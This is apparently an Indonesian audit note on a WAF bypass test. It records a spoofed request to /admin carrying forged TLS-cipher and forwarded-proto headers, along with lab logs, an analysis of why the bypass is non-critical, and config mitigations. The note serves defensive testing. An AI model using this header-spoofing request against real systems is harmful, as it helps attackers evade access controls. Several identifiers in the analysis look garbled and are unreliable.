---
title: "Bypass 7 — Zero Trust Header Spoofing (VERIFIED — VALID, non-critical)"
tags: ["waf", "bypass", "jarswaf", "zero-trust", "header-spoof"]
aliases: ["zt-header-spoof-bypass", "X-SSL-Cipher-spoof"]
created: 2026-07-31
updated: 2026-07-31
status: Completed
---

> [!abstract]
> **Klaim:** Spoof header TLS/X-SSL-Cipher melalui X-Forwarded-Proto dan X-SSL-Cipher untuk
> melewati Zero Trust check.
> **Verdict:** VALID tapi NON-KRITIKAL — header diteruskan ke backend, namun Zero Trust rules
> tidak aktif di konfigurasi test. WAF tidak terpengaruh karena Client-Hello asli dipakai untuk
> BOT-JA4 dan signal autentikasi internal, bukan header yang di-spoof.

## Eksploitasi

```
GET /admin HTTP/1.1
Host: target.jarswafwaf.demo
X-Forwarded-Proto: https
X-SSL-Cipher: TLS_AES_256_GCM_SHA384
X-TLS-Version: TLSv1.3
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)... Chrome/126.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml
```

## Hasil Uji Labor

```
HTTP 200 | Time: 0.0013s | Size: 2 bytes
```

Log backend menerima permintaan:
```
=== GET /admin from 127.0.0.1 ===
  X-Forwarded-Proto: https                    ← HADIR di backend
  X-SSL-Cipher: TLS_AES_256_GCM_SHA384        ← HADIR di backend
  X-TLS-Version: TLSv1.3                      ← HADIR di backend
  Authorization: Bearer eyJhbG...             ← HADIR
  User-Agent: Mozilla/5.0 ...
```

Log WAF:
```
{"action":"ANOMALY","rule_id":"ANOMALY-FINGERPRINT-001","reason":"Request fingerprint changed mid-session"}
{"action":"PASS","rule_id":"WAF-HEADER-PASS","reason":"All header-level WAF rules passed"}
{"action":"PASS","rule_id":"ALLOW","reason":"Status: 200"}
```

## Analisis Technical

1. **WAF menggunakan X-Forwarded-For untuk** membaca IP asli — jika sender **tidak ada** di `trusted_proxies`, header ini di-strip.
2. **X-SSL-Cipher/TLS-Version adalah header level aplikasi, BUKAN properti TLS handshake** — pingora menggunakan `Client::ssl_cipher()` dari session TLS, bukan header ini.
3. `hpd-membackend-misi-resolve_ip_asn()` memakai Maximind DB dari IP socket, tidak dari header.
4. **XT-ini-implementasi** tidak **menjalankan ZT-TRUST-SCORE** karena rules `["SQLI-*", "XSS-*", ...]` di `vhosts.rules` tidak mencakup `"ZT-*"`.

## Perbaiki / Mitigasi

1. Tambah `"ZT-*"` atau `["*"]` ke `vhosts.rules` di config untuk mengaktifkan Zero Trust check.
2. X-SSL-Cipher dan X-TLS-Version adalah header yang **tidak perlu diteruskan untuk backend** — bisa distrip oleh WAF upstream dengan add_rule "Strip`X-SSL-Cipher", dll.

## Cross-Reference

- Expected in [[waf-audit-2026-07-31]]
- Analysis also conbes dengan [[waf-bypass-6-multipart-101-parts.md]]